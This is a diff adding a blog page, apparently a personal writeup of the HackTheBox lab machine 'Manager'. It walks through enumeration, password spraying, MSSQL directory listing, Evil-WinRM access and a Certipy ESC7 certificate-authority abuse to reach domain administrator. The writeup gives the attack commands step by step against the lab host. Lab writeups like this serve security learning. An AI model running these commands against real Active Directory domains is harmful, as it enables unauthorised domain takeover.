@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Manager cfec3cd46494480db7224387594ecdf2 | Pwn3d777</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Manager cfec3cd46494480db7224387594ecdf2" />
+<meta name="author" content="GitHub User" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Manager" />
+<meta property="og:description" content="Manager" />
+<link rel="canonical" href="https://your-site-url/writeups/2025/07/10/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d.html" />
+<meta property="og:url" content="https://your-site-url/writeups/2025/07/10/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d.html" />
+<meta property="og:site_name" content="Pwn3d777" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-07-10T16:05:57+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Manager cfec3cd46494480db7224387594ecdf2" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-10T16:05:57+00:00","datePublished":"2025-07-10T16:05:57+00:00","description":"Manager","headline":"Manager cfec3cd46494480db7224387594ecdf2","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/10/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d.html"},"url":"https://your-site-url/writeups/2025/07/10/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://your-site-url/feed.xml" title="Pwn3d777" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pwn3d777<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/bitbrain_"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-red-hover" href="https://bitbrain.itch.io"><i class="fab fa-itch-io"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/bitbrain"><i class="fab fa-github-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Manager cfec3cd46494480db7224387594ecdf2</h1>
+  
+  <div class="post-date">
+    Published on 10 Jul 2025
+    
+  </div>
+  
+  <h1 id="manager">Manager</h1>
+
+<p>HackTheBox: Medium</p>
+
+<h2 id="1-enumeration">1: Enumeration</h2>
+
+<ul>
+  <li>nmap scanning</li>
+</ul>
+
+<p><img src="/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled.png" alt="Untitled" /></p>
+
+<p>With Rustscan we found</p>
+
+<blockquote>
+  <p>445 SMB
+1433 mssql
+464 kpass
+88 Kerberos</p>
+
+</blockquote>
+
+<p><img src="/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_1.png" alt="Untitled" /></p>
+
+<p>That’s how we find active users in the machine</p>
+
+<p>~Spray all the users found using Crackmapexec</p>
+
+<p><img src="/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_2.png" alt="Untitled" /></p>
+
+<h2 id="2-user-flag">2: User flag</h2>
+
+<blockquote>
+  <p>Crackmapexec is a useful tool but it is not maintained anymore so we are going to chanche a .py file something with the ssl version.</p>
+
+</blockquote>
+
+<p>Enum shared resources</p>
+
+<aside>
+💡 Impacket-smbclient
+Impacket-mssqlclient
+
+</aside>
+
+<p><img src="/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_3.png" alt="Untitled" /></p>
+
+<p>Once inside of shared resources we were able to access the database tables, we started looking into their contents. We hace content in xp_dirtree</p>
+
+<p>We can check documentation to find web page resources</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> EXEc xp_dirtree <span class="s1">'C:\inetpub\wwwroot'</span>, 1, 1<span class="p">;</span>
+</code></pre></div></div>
+
+<p>find a website backup  with creds, use wget to download it locally, using evil-wirm to access</p>
+
+<p><img src="/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_4.png" alt="Untitled" /></p>
+
+<h2 id="3-priv-esc">3: Priv esc</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span> /groups /priv
+</code></pre></div></div>
+
+<p><img src="/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_5.png" alt="Untitled" /></p>
+
+<p>Evil winrm a advantage, the capacity of upload and create files from remote machine</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload cerfity.exe
+./Certify.exe find /vulnerable
+</code></pre></div></div>
+
+<blockquote>
+  <p>Now we’re gonna use certipy, with an auth we get  specific vulnerabilities and exploit them</p>
+
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy find <span class="nt">-u</span> user@--- <span class="nt">-p</span> <span class="s2">"rtgre"</span> <span class="nt">-enable</span> <span class="nt">-vulnearable</span> <span class="nt">-target</span> manager.htb
+</code></pre></div></div>
+
+<p>Vulnerable to ESC7 find mor info <a href="https://github.com/ly4k/Certipy#esc7">HERE</a> and exploit</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Add an officer named 'raven' to the CA named 'manager-DC01-CA' given managecertificate rights</span>
+certipy ca <span class="nt">-ca</span> <span class="s1">'manager-DC01-CA'</span> <span class="nt">-add-officer</span> raven <span class="nt">-username</span> raven@manager.htb <span class="nt">-password</span> <span class="s1">'&lt;password&gt;'</span> 
+
+<span class="c">#Enable a certificate template named 'SubCA' for the CA 'manager-DC01-CA'.</span>
+certipy ca <span class="nt">-ca</span> <span class="s1">'manager-DC01-CA'</span> <span class="nt">-enable-template</span> SubCA <span class="nt">-username</span> raven@manager.htb <span class="nt">-password</span> <span class="s1">'&lt;password&gt;'</span> 
+
+<span class="c">#Submit a certificate request for the template 'SubCA' to the CA 'manager-DC01-CA'.</span>
+<span class="c">#It fails but we just need the private key to sign the certificate to issue directly</span>
+certipy req <span class="nt">-username</span> raven@manager.htb <span class="nt">-password</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">-ca</span> <span class="s1">'manager-DC01-CA'</span> <span class="nt">-target</span> manager.htb <span class="nt">-template</span> SubCA <span class="nt">-upn</span> administrator@manager.htb 
+
+<span class="c">#Issue the certificate based on the request submitted.</span>
+certipy ca <span class="nt">-ca</span> <span class="s2">"manager-DC01-CA"</span> <span class="nt">-issue-request</span> &lt;private_key_id&gt; <span class="nt">-username</span> <span class="s1">'raven@manager.htb'</span> <span class="nt">-password</span> <span class="s1">'&lt;password&gt;'</span> 
+
+<span class="c">#Retrieve the issued certificate.</span>
+certipy req <span class="nt">-username</span> <span class="s1">'raven@manager.htb'</span> <span class="nt">-password</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">-ca</span> <span class="s2">"manager-DC01-CA"</span> <span class="nt">-target</span> manager.htb <span class="nt">-retrieve</span> &lt;private_key_id&gt;
+</code></pre></div></div>
+
+<p>You’ve got a hash for admin with</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy auth <span class="nt">-pfx</span> administrator.pfx <span class="nt">-dc-ip</span> 10.10.11.236
+</code></pre></div></div>
+
+<p>Whether for some reason it shows you an error message try to sync servers like this</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>ntpdate <span class="nt">-u</span> manager.htb
+</code></pre></div></div>
+
+<p>And finally</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.11.236 <span class="nt">-u</span> administrator <span class="nt">-H</span> password
+</code></pre></div></div>
+
+<p>Machine pwned!!!</p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'https://your-site-url/writeups/2025/07/10/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d.html';
+     this.page.identifier = '/writeups/2025/07/10/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d';
+     this.page.title = 'Manager cfec3cd46494480db7224387594ecdf2';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//<your-disqus-shortname>.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html">
+            Dog 207b952552918059ae99cbb25a8392ef
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9.html">
+            Titanic 1eab9525529180a9b52fc9a7eb126a50
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb.html">
+            Cat 1abb9525529180ae82d4f25f2121346a
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
